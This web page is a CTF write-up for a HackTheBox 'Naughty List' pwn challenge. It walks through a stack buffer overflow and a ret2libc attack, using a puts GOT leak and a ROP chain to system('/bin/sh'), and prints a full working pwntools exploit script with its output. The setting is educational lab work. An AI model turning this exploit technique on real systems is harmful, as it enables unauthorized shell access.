<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Naughty List - Exploitation Freaks</title>
        <!-- Custom HTML head -->
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Exploitation</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwntools-debugging.html"><strong aria-hidden="true">2.1.</strong> Pwntools Debugging</a></li><li class="chapter-item expanded "><a href="cve-2015-3887.html"><strong aria-hidden="true">2.2.</strong> CVE-2015-3887</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.3.</strong> TetCTF 2022</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="newbie_tetctf.html"><strong aria-hidden="true">2.3.1.</strong> Newbie</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.4.</strong> Cyber Santa is Coming to Town</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="hackthebox-pwn-snowy.html"><strong aria-hidden="true">2.4.1.</strong> Mr Snowy</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-sleigh.html"><strong aria-hidden="true">2.4.2.</strong> Sleigh</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-naughty-list.html" class="active"><strong aria-hidden="true">2.4.3.</strong> Naughty List</a></li><li class="chapter-item expanded "><a href="hackthebox-pwn-minimelfistic.html"><strong aria-hidden="true">2.4.4.</strong> Minimelfistic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.5.</strong> ROPEmporium</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="ropemporium-split.html"><strong aria-hidden="true">2.5.1.</strong> Split</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.6.</strong> NahamCon 2021</div></li><li class="chapter-item expanded "><a href="nahamcon_ret2basic.html"><strong aria-hidden="true">2.7.</strong> ret2basic</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.</strong> Reverse Engineering</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="anatomy-of-a-gopher.html"><strong aria-hidden="true">3.1.</strong> Anatomy of a Gopher</a></li><li class="chapter-item expanded "><a href="gomalware-reversing-in-action.html"><strong aria-hidden="true">3.2.</strong> Go Malware Reverse Engineering with Kaspersky</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.3.</strong> Arizona State University Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="pwn-college-embryoasm_level6.html"><strong aria-hidden="true">3.3.1.</strong> EmbryoASM Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell_level1.html"><strong aria-hidden="true">3.3.2.</strong> BabyShell Level 1</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level3.html"><strong aria-hidden="true">3.3.3.</strong> BabyShell Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level4.html"><strong aria-hidden="true">3.3.4.</strong> BabyShell Level 4</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level5.html"><strong aria-hidden="true">3.3.5.</strong> BabyShell Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level6.html"><strong aria-hidden="true">3.3.6.</strong> BabyShell Level 6</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level7.html"><strong aria-hidden="true">3.3.7.</strong> BabyShell Level 7</a></li><li class="chapter-item expanded "><a href="pwn-college-babyshell-level8.html"><strong aria-hidden="true">3.3.8.</strong> Babyshell Level 8</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-5.html"><strong aria-hidden="true">3.3.9.</strong> BabyReverse Level 5</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-10.html"><strong aria-hidden="true">3.3.10.</strong> BabyReverse Level 10</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-13.html"><strong aria-hidden="true">3.3.11.</strong> BabyReverse Level 13</a></li><li class="chapter-item expanded "><a href="pwn-college-baby_reversing-15.html"><strong aria-hidden="true">3.3.12.</strong> BabyReverse Level 15</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-2.html"><strong aria-hidden="true">3.3.13.</strong> EmbryoGDB Level 2</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-3.html"><strong aria-hidden="true">3.3.14.</strong> EmbryoGDB Level 3</a></li><li class="chapter-item expanded "><a href="pwn-college-embryogdb-4.html"><strong aria-hidden="true">3.3.15.</strong> EmbryoGDB Level 4</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.4.</strong> Flare 8 (2021)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="credchecker.html"><strong aria-hidden="true">3.4.1.</strong> credchecker</a></li><li class="chapter-item expanded "><a href="flare-on_known.html"><strong aria-hidden="true">3.4.2.</strong> known</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">3.5.</strong> Flare 7 (2020)</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="flare-on_garbage.html"><strong aria-hidden="true">3.5.1.</strong> garbage</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">4.</strong> Programming</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">4.1.</strong> The Linux Programming Interface</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="programming-tee.html"><strong aria-hidden="true">4.1.1.</strong> Exercise 4.1 (reproducing the tee linux binary)</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.</strong> Practical Binary Analysis Notes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">5.1.</strong> Chapter 1</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-1.html"><strong aria-hidden="true">5.1.1.</strong> The C Compilation Process</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-2.html"><strong aria-hidden="true">5.1.2.</strong> Symbols and Stripped Binaries</a></li><li class="chapter-item expanded "><a href="practical_binary_analysis_c1-3.html"><strong aria-hidden="true">5.1.3.</strong> Disassembling a Binary</a></li></ol></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">6.</strong> Networking</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="mass-wificracking.html"><strong aria-hidden="true">6.1.</strong> Mass Wifi Cracking at Scale</a></li><li class="chapter-item expanded "><a href="half-handshake-crack.html"><strong aria-hidden="true">6.2.</strong> Half-Handshake Crack</a></li><li class="chapter-item expanded "><a href="tn-wn722n-monitor-mode.html"><strong aria-hidden="true">6.3.</strong> TN-WN722N Monitor Mode</a></li><li class="chapter-item expanded "><a href="awus036ach-monitor-mode.html"><strong aria-hidden="true">6.4.</strong> AWUS036ACH Monitor Mode</a></li><li class="chapter-item expanded "><a href="rpi-rtl88x2bu-evil-AP.html"><strong aria-hidden="true">6.5.</strong> RTL88x2bu Fake Access Point</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">7.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="windows-cheatsheet.html"><strong aria-hidden="true">7.1.</strong> Windows Cheatsheet</a></li><li class="chapter-item expanded "><a href="wireshark_weaponization.html"><strong aria-hidden="true">7.2.</strong> Wireshark Weaponization</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">8.</strong> Other</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="irc.html"><strong aria-hidden="true">8.1.</strong> Join a IRC Server anonymously</a></li><li class="chapter-item expanded "><a href="bashfuscator.html"><strong aria-hidden="true">8.2.</strong> Bashfuscator</a></li><li class="chapter-item expanded "><a href="python_socketio.html"><strong aria-hidden="true">8.3.</strong> Python - Working with socket.io</a></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Exploitation Freaks</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="cyber-santa-is-coming-to-town-pwn-naughty-list"><a class="header" href="#cyber-santa-is-coming-to-town-pwn-naughty-list">Cyber Santa is Coming to Town (Pwn Naughty List)</a></h1>
<p>This challenge was remarkable because it was one of the simplest and most educative <code>ret2libc</code> challenge i've done so far. It was pretty straightforward, finding the vulnerability took me a minute or two, and since they gave me a <code>libc.so.6</code> file, i knew it was ret2libc.</p>
<h2 id="preparing-the-challenge"><a class="header" href="#preparing-the-challenge">Preparing the Challenge</a></h2>
<p>Before starting the challenge you will need to make sure you have the right version of the linker and the right version of libc, usually you can check the string of the libc binary and search for a ubuntu version then you can run a docker on that right version.</p>
<pre><code>$ strings ./libc.so.6 | grep &quot;ubuntu&quot;
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
</code></pre>
<p>Looking at the output we can see that our program was compiled using <code>ubuntu version 18.04</code>, you can run a docker with that specific version of ubuntu using the following command.</p>
<pre><code>$ docker run -it ubuntu:18.04
root@1e005e022242:/#
</code></pre>
<p>But for this challenge we will use <code>pwninit</code>, so i don't have to set up a whole docker environment, as you have probably noticed docker doesn't come with any useful binaries for exploitation, using my main machine will be way much simpler. So you can start by getting <code>pwninit</code> using the following command.</p>
<pre><code>$ cargo install pwninit
</code></pre>
<p>Then you can run pwninit in the directory of the vulnerable binary.</p>
<pre><code>$ pwninit
bin: ./naughty_list
libc: ./libc.so.6
ld: ./ld-2.27.so

copying ./naughty_list to ./naughty_list_patched
running patchelf on ./naughty_list_patched
</code></pre>
<p>You can either used the binary <code>pwninit</code> generated or patched the binary on your own, you would usually do this with the <code>patchelf</code> utility.</p>
<pre><code>$ patchelf --set-interpreter ./ld-2.27.so --replace-needed libc.so.6 /challenge/pwn_naughty_list/libc.so.6 ./naughty_list
</code></pre>
<p>Then you should now be able to run your binary with the right linker and libc versions ! You can verify this by using <code>ldd</code> on your binary.</p>
<pre><code>$ ldd ./naughty_list
        linux-vdso.so.1 (0x00007ffee7b73000)
        /challenge/pwn_naughty_list/libc.so.6 (0x00007f1c32b1f000)
       ./ld-2.27.so =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f1c32f17000)
</code></pre>
<p>We can confirm that our  challenge use the right linker and the right libc versions.</p>
<h2 id="solving-the-challenge"><a class="header" href="#solving-the-challenge">Solving the Challenge</a></h2>
<p>Solving this challenge will be a little longer than the previous writeups i've did so far since ret2libc is a little more complicated. So without hesitating let's solve this challenge.</p>
<p>First thing i will do is find the vulnerable point in the program, i suggest you open the binary in ghidra for that, or you can go in fully 1337 mode and use only gdb. (disassemblers exist for a good reason tho).</p>
<p>Looking at the main function we can see 4 different functions that asks for our input.
<img src="https://i.imgur.com/cgUkVpv.png" alt="Potentially Vulnerable Functions" /></p>
<p>Looking deeper into each of these functions we notice that the functions <code>get_name, get_surname, get_age</code>. However we do not have any restrictions on our last function <code>get_descr</code>.
<img src="https://i.imgur.com/GRBbFVq.png" alt="No Restrictions on get_descr input" /></p>
<p>We can also see in the screenshot that we read <code>0x3c0 bytes (960)</code> of input inside a buffer of <code>32 bytes</code> which is clearly vulnerable to a buffer overflow.</p>
<p>We can try to make our binary <code>SEGFAULT</code> by running it and sending a little more than ~32 bytes of input, let's try this in practice</p>
<pre><code>$ ./naughty_list

~ Ho Ho Ho Santa is here ~

       _______________
    0==( Naughty List (c==0
       '______________'|
         | Name        |
         | Gift        |
       __)_____________|
   0==(               (c==0
       '--------------'

[*] Enter your name    (letters only): penis
[*] Enter your surname (letters only): penis
[*] Enter your age (18-120): 69
[+] Name:    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[*] 🎅 will take a better look and hopefuly you will get your 🎁!
[1]    3876 segmentation fault (core dumped)  ./naughty_list
</code></pre>
<p>Running a cyclic string with our binary in gdb reveals that we overwrite our return address after <code>40 bytes of input</code>. We can start writing our exploit the following way.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;)
libc = pwn.ELF(&quot;libc.so.6&quot;)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40
</code></pre>
<p>Now the second step in a ret2libc attack is to leak the address of a functions in the .got section, this should be pretty simple to do.</p>
<p>Let's start by finding a <code>pop_rdi; ret</code> instruction using ropper, so we can align our stack before starting to do a <code>ropchain</code>.</p>
<pre><code>$ ropper -- --search &quot;pop rdi; ret&quot; --file ./naughty_list
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./naughty_list
0x0000000000401443: pop rdi; ret;
</code></pre>
<p>We see that at address <code>0x0000000000401443</code>, we have the <code>pop rdi; ret</code> instruction. We can take that value and add it into our python script.</p>
<pre><code class="language-py">pop_rdi = pwn.p64(0x0000000000401443)
</code></pre>
<p>Sometimes using <code>ret</code> instead of <code>pop rdi; ret</code> is a better idea, since it's totally doable you can search for a <code>ret</code> instruction in the binary and you can add it the same way we just did with <code>pop_rdi</code>.</p>
<p>Next thing we need to do is to find a function we want to leak the address of, so what i did was open <code>bpython or python</code>, and you can do the following to see the different functions available in the <code>.got</code> section.</p>
<pre><code>&gt;&gt;&gt; import pwn
&gt;&gt;&gt; e = pwn.ELF(&quot;./naughty_list&quot;)
[*] '/challenge/pwn_naughty_list/naughty_list'
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3ff000)
&gt;&gt;&gt; e.got
{'__libc_start_main': 6299632, '__gmon_start__': 6299640, 'stdout': 6299744, 'stdin': 6299760, 'toupper': 6299520, '
puts': 6299528, 'strlen': 6299536, 'printf': 6299544, 'memset': 6299552, 'alarm': 6299560, 'read': 6299568, 'srand':
6299576, 'strcmp': 6299584, 'time': 6299592, 'setvbuf': 6299600, '__isoc99_scanf': 6299608, 'fwrite': 6299616, 'ran
d': 6299624}
</code></pre>
<p>We can notice a few functions we can leak, but for this challenge we will simply use <code>puts</code>, so we can continue our script the following way.</p>
<pre><code class="language-py">puts_at_got = pwn.p64(e.got.puts)
</code></pre>
<p>And since we want to leak the address of that function we need to get the address of <code>puts</code> in the <code>plt</code> section, this will cause <code>puts</code> to be called with the address of <code>puts_at_got</code> as argument (the address of puts in libc), therefore leaking the address on the screen, we can use pwntools to receive the line and to unpack the value. You can add thefollowing to your script.</p>
<pre><code class="language-py">puts_at_plt = pwn.p64(e.plt.puts)
</code></pre>
<p>Okay so now we can see if our script is able to leak the address of puts on the screen, your script should look like the following.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;)
libc = pwn.ELF(&quot;libc.so.6&quot;)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)

payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got
    puts_at_plt
]

io.sendlineafter(b&quot;:&quot;, &quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, &quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, &quot;69&quot;)

io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))

io.interactive()
</code></pre>
<p>Running the python script confirms that it indeed leaks the address of the puts function.</p>
<pre><code>python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4512
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0\xfa\xed3
[*] Got EOF while reading in interactive
</code></pre>
<p>Leaking the function is cool, but the program directly ends after that since our program don't have any valid instruction to execute, for this reason if we want to exploit the program we will need to make a jump into the vulnerable function <code>get_descr</code>. So we're going to add the address of the <code>get_descr</code> function after our call to puts in the plt.</p>
<pre><code class="language-py">get_descr = pwn.p64(e.symbols.get_descr)
</code></pre>
<p>Don't forget to add the line in the payload field after <code>puts_at_plt</code>.</p>
<pre><code class="language-py">payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]
</code></pre>
<p>You can rerun the program, and see that after leaking the address, it jump backs to our vulnerable function.</p>
<pre><code>python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4567
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0z֗\xd5

[*] Name of the gift you want and why you were good enough to deserve it: $ test
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
</code></pre>
<p>Notice how the program asks us a second time for the same vulnerable input, this means we successfully were able to jump back inside our vulnerable function.</p>
<p>Now we need our program to parse the leaked function address, for this we will need to do some trial and error with <code>recvline</code> until we have the right number of lines. After testing i know that i need to skip 6 lines before it leaks our input so you can add the following to your script.</p>
<pre><code>io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)
</code></pre>
<p>Running our script now shows that we indeed leak the <code>puts</code> function address properly, and that we were able to store it in a variable called <code>leak</code>.</p>
<p>Now to calculate the <code>libc base address</code>, we can substract the offset of the <code>puts</code> function in libc to the address of <code>puts</code> we leaked, this should give us the base address. To find an offset we are going to use the readelf utility.</p>
<pre><code>readelf -s ./libc.so.6 | grep GLIBC | grep puts
   191: 0000000000080aa0   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   422: 0000000000080aa0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   496: 0000000000126550  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   678: 0000000000128460   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
   1141: 000000000007f2d0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
</code></pre>
<p>We see that the <code>puts</code> function as an offset of <code>0000000000080aa0</code> in <code>libc</code>, let's add the following to our script.</p>
<pre><code class="language-py">puts_libc_offset = 0x0000000000080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)
</code></pre>
<p>Next we can create a <code>ROP</code> object and exploit the program using a call to <code>system(&quot;/bin/sh&quot;)</code>, this is pretty simple to do. Add the following to your script. <em>Note that for an obscure reason, the pop_rdi didn't worked with the second payload, so i used a single ret instead and it worked well</em></p>
<pre><code class="language-py">rop = pwn.ROP(libc)
rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
io.sendline(pwn.flat({PADDING: [ret, rop.chain()]}))
</code></pre>
<p>You should have now the following code in your script.</p>
<pre><code class="language-py">import pwn

e = pwn.ELF(&quot;./naughty_list&quot;, checksec=False)
libc = pwn.ELF(&quot;libc.so.6&quot;, checksec=False)
io = pwn.process(e.path)
pwn.context.arch = &quot;amd64&quot;
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)
get_descr = pwn.p64(e.symbols.get_descr)

payload = [
    b&quot;A&quot;*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]

io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;69&quot;)
io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))

io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)

puts_libc_offset = 0x080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)

rop = pwn.ROP(libc)
rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
io.sendlineafter(b&quot;:&quot;, pwn.flat({PADDING: [ret, rop.chain()]}))
io.interactive()
</code></pre>
<p>Running it either locally or remotely on a vulnerable machine drops us a shell, you can read the flag in the flag.txt file ! Hopefully you enjoyed the challenge and the writeup.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="hackthebox-pwn-sleigh.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                            <a rel="next" href="hackthebox-pwn-minimelfistic.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="hackthebox-pwn-sleigh.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>
                    <a rel="next" href="hackthebox-pwn-minimelfistic.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
    </body>
</html>
